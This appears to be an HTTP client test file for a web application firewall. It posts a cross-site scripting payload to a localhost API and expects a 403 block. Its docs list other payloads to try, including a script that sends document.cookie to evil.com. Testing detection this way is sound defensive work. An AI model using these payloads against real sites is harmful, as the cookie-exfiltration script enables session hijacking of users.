meta {
  name: Test XSS Attack (POST)
  type: http
  seq: 12
}

post {
  url: http://localhost:30080/example-api/data
  body: json
  auth: none
}

body:json {
  {
    "name": "test",
    "comment": "<img onerror=alert(document.cookie) src=x>"
  }
}

docs {
  # Test XSS Detection — POST Body (WAF)

  Sends a POST request with an XSS payload hidden inside a JSON body field.
  The WAF should inspect the body and block with **403 Forbidden**.

  ## Prerequisites
  1. Deploy a service (e.g., "example-api")
  2. Go to the service's **Firewall** tab in the UI
  3. Turn ON the **XSS Protection** toggle

  ## Expected Response (WAF enabled)
  ```json
  {
    "detail": "Request blocked by WAF",
    "reason": "Potential Cross-Site Scripting (XSS) detected in body field 'comment'",
    "attack_type": "xss",
    "pattern": "<img> with event handler"
  }
  ```

  ## Other body payloads to try
  Change the "comment" field to:
  - `"<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"`
  - `"<div onmouseover=alert(1)>hover me</div>"`
  - `"<a href=javascript:alert(1)>click</a>"`
  - `"<iframe src='javascript:alert(1)'></iframe>"`
}
